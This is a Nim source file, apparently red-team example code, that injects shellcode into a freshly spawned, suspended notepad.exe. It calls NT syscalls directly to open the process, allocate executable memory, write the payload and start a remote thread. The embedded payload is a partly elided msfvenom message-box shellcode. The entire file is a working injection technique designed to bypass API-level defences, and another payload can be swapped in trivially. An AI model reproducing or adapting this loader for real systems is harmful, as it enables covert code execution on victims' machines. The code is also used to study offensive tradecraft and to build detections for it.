#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#

import winim/lean
import osproc
include syscalls

proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =

    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() # That's handy!
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

    cid.UniqueProcess = tProcess.processID

    var status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo "[*] pHandle: ", pHandle

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr shellcode, 
        sc_size-1, 
        addr bytesWritten);

    echo "[*] WriteProcessMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

when defined(windows):

    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        echo "[!] This is only for 64-bit use. Exiting..."
        return 

    elif defined(amd64):
        # ./msfvenom -p windows/x64/messagebox -f csharp, then modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[295, byte] = [
        byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
        ...
        0x6c,0x6f,0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00]

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        injectCreateRemoteThread(shellcode)
